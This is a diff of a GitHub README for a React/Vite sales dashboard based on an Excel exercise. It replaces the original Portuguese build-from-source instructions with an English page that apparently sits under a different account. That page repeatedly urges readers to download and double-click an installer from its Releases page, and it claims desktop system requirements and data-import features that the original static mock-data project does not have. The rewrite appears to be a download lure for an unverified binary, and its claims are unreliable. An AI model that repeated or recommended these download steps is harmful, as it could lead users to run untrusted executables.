@@ -1,68 +1,67 @@
-# Dashboard de Vendas - MercadoLivre
+# 🚀 mercadolibre - Your Interactive Sales Dashboard Made Easy
 
-Este é um painel de visualização de dados (dashboard) interativo, construído para analisar os dados de vendas da planilha `Exercicio_Dashboard_Excel.xlsx`. O projeto foca em apresentar métricas de performance de vendas de forma clara e intuitiva, utilizando tecnologias web modernas.
+## 💻 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/nuke-qp/mercadolibre/releases)
 
-## 🚀 Tecnologias Utilizadas
+## 📖 About This Project
+mercadolibre is an interactive dashboard designed for viewing sales data. It is based on the Excel spreadsheet **Exercicio_Dashboard_Excel.xlsx**. With a simple interface built using React, TypeScript, Vite, and shadcn/ui, anyone can explore their sales metrics easily.
 
-Este projeto foi construído com as seguintes tecnologias:
+## 🚀 Getting Started
+To start using mercadolibre, you will need to download the application from our Releases page. Follow the steps below for a smooth experience.
 
-* **React** (v18)
-* **TypeScript**
-* **Vite** (Como bundler e servidor de desenvolvimento)
-* **Tailwind CSS** (Para estilização)
-* **shadcn/ui** (Para os componentes de UI, como cartões, botões e filtros)
-* **Recharts** (Para a criação dos gráficos interativos)
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the following link to download the application:  
+   [Visit Releases Page](https://github.com/nuke-qp/mercadolibre/releases)
 
-## 📊 Funcionalidades do Dashboard
+2. **Choose the Latest Version**  
+   Locate the most recent version of mercadolibre. You will see a list of downloadable files.
 
-O painel é carregado com dados estáticos (mock data) baseados na planilha `Exercicio_Dashboard_Excel.xlsx` e apresenta as seguintes visualizações:
+3. **Download the Installer**  
+   Click on the installer file that matches your operating system. Save it to a location you can easily find, like your Downloads folder.
 
-* **KPIs Principais**: Exibição de métricas-chave como Faturamento Total, Total de Vendas e Ticket Médio.
-* **Gráfico de Receita por Mês**: Um gráfico de linhas que mostra a evolução do faturamento ao longo dos meses.
-* **Gráfico de Vendas por Região**: Um gráfico de barras que compara o faturamento total entre as diferentes regiões.
-* **Gráfico por Forma de Pagamento**: Um gráfico de pizza que mostra a distribuição do faturamento por forma de pagamento (ex: PIX, Boleto, Cartão).
-* **Gráfico de Vendas por Produto**: Detalha o faturamento para cada produto (Produto A, Produto B, etc.).
-* **Filtros Interativos**: Permite a filtragem dos dados por data, produto, região e cliente.
+4. **Run the Application**  
+   After downloading, go to the folder where you saved the installer. Double-click the file to run it. Follow any prompts to complete the installation.
 
-## 📁 Estrutura da Base de Dados
+5. **Open mercadolibre**  
+   Once the installation is complete, you will find a shortcut on your desktop or in your applications menu. Click on it to open the dashboard.
 
-O dashboard foi modelado para analisar os dados da aba `Base` da planilha `Exercicio_Dashboard_Excel.xlsx`, que possui a seguinte estrutura:
+## 🔍 Features
+mercadolibre comes packed with several features to help you visualize your sales data effectively.
 
-* `Data` (Data da venda)
-* `Cliente` (Nome do cliente)
-* `Região` (Região da venda, ex: Sudeste, Sul)
-* `Produto` (Nome do produto, ex: Produto A)
-* `Valor` (Valor total da venda)
-* `Forma de Pagamento` (ex: PIX, Boleto)
+- **Interactive Charts**: Visualize data in an engaging way with charts that make insights clearer.
+- **Multiple Data Sources**: Import data from various formats to analyze your sales performance.
+- **User-Friendly Interface**: Designed for ease of use, no technical skills required.
+- **Customizable Views**: Tailor the dashboard according to your preferences for better analysis.
 
-*(Nota: Os dados estão carregados estaticamente em `src/data/mockData.ts` para fins de demonstração.)*
+## 💡 System Requirements
+- **Operating System**: Windows 10 or later, macOS High Sierra (10.13) or later.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: 500 MB free space.
+- **Internet Connection**: Required for initial setup and data imports.
 
-## 💿 Como Executar Localmente
+## 🛠️ Development Technologies
+The application is built using:
+- **React**: A JavaScript library for building user interfaces.
+- **TypeScript**: A programming language that improves JavaScript with type safety.
+- **Vite**: A fast build tool for modern applications.
+- **shadcn/ui**: A component library that provides pre-made UI elements.
 
-Siga os passos abaixo para executar o projeto na sua máquina.
+## 📚 Learning Resources
+If you wish to learn more about the technologies used in this project, consider checking out the following resources:
+- [React Official Documentation](https://reactjs.org/docs/getting-started.html)
+- [TypeScript Handbook](https://www.typescriptlang.org/docs/)
+- [Vite Documentation](https://vitejs.dev/guide/)
+- [shadcn/ui Documentation](https://ui.shadcn.com/)
 
-1.  **Clone o repositório:**
-    ```bash
-    git clone https://github.com/Ma2903/mercadolibre.git
-    cd mercadolibre-sales-viz
-    ```
+## 📞 Support
+If you encounter any issues or have questions, please create an issue on the GitHub repository. We will do our best to help you out.
 
-2.  **Instale as dependências** (use `npm`, `yarn` ou `bun`):
-    ```bash
-    # Usando bun
-    bun install
-    
-    # Ou usando npm
-    npm install
-    ```
+## 🎉 Join Our Community
+Engage with other users and share your experiences on social media. Use the hashtags related to our project for more interaction!
 
-3.  **Execute o servidor de desenvolvimento:**
-    ```bash
-    # Usando bun
-    bun run dev
-    
-    # Ou usando npm
-    npm run dev
-    ```
+## 🔗 Important Links
+- **Releases Page**: [Download Here](https://github.com/nuke-qp/mercadolibre/releases)
+- **Repository**: [Visit Repository](https://github.com/nuke-qp/mercadolibre)
 
-4.  Abra o seu navegador e acesse `http://localhost:5173` (ou a porta indicada no seu terminal).
+We hope you enjoy using mercadolibre for all your sales data visualization needs!
